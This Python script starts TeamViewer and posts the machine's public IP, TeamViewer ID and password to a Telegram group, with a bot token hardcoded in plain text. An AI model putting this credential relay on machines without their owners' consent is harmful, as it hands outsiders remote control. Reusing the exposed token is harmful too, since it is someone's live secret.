import typing as t
import time

import requests
import socket

import telegram

from telegram import Message, Chat, User, Update
from telegram.ext import (
    CommandHandler,
    MessageHandler,
    CallbackContext,
    Filters,
    Updater,
    Dispatcher,
)

from teamviewer import StartTeamviewer


def GetIP() -> str:
    return requests.get("https://api.ipify.org").text


def on_group_messages(update: Update, context: CallbackContext) -> int:
    update.message.reply_text(GetIP())
    # print(update.message.chat_id)


def SendMessage(text: str):
    updater.bot.send_message(chat_id=GROUP_CHAT_ID, text=text)


GROUP_CHAT_ID = -732272761
BOT_TOKEN = "5350387444:AAGIE1KXPL5Py1OdTfYWJ_mmFkFjLcPkLxM"

updater = Updater(BOT_TOKEN, use_context=True)
dispatcher: Dispatcher = updater.dispatcher

dispatcher.add_handler(
    MessageHandler(
        filters=Filters._ChatType.groups,
        callback=on_group_messages,
        run_async=True,
    ),
    group=GROUP_CHAT_ID,
)

# updater.start_polling()
# updater.idle()

SendMessage(f"Bot online at: {GetIP()}")

result = None

while result == None:
    result = StartTeamviewer("TeamViewer\\TeamViewer.exe")
    if result == None:
        SendMessage("Failed to start Teamviewer, retrying..")

id, pw = result

SendMessage(id)
SendMessage(pw)

while True:
    time.sleep(1)
